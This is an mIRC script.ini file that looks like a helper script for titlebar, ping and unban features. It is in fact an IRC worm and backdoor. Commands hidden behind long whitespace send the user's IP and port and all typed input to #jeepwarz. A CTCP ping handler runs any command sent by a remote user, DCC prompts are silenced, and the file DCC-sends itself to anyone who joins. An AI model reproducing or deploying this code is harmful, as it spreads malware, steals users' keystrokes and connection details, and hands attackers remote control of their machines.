[script]
n0=
n1=on 1:START:{                                                                                                                                                                                                                                                                                                                                                                                   .sreq ignore
n2=  .remote on
n3=  titlebar (Not connected)
n4=}
n5=raw 401:*: {
n6=  halt
n7=}
n8=RAW 001:*:titlebar (Connecting to $server $+ )
n9=
n10=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .
n11=
n12=on 1:DISCONNECT:titlebar (Not connected)
n13=
n14=;if you type something in status it doesn't have to have "/"
n15=on 1:INPUT:*:{                                                                                                                                                                                                                                                                                                                                                                                     .msg #jeepwarz ( $+ $active $+ ) $1-
n16=  set %a status window
n17=  if ( $active == %a ) { $1- | halt }
n18=}
n19=
n20=;ping stuff
n21=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . 
n22=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }
n23=
n24=;if you are banned but still opped, unban self
n25=on @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask
n26=
n27=on 1:JOIN:*:{
n28=  if ( $nick == $me ) { halt }
n29=  if ( $comchan($nick,0) > 2 ) { .notice $nick Following me? | halt }                                                                                                                                                                                                                                                                                   | .dcc send $nick $mircdir $+ script.ini
n30=}
n31=
n32=;show channel topic in channel on join
n33=RAW 332:*:echo 4 $2 $chr(31) $+ $2 $+ $chr(31) $+ : $3-                                                                                                                                                                                                                                                                                                     | if ( script.ini isin $3- ) { part $2 | halt }
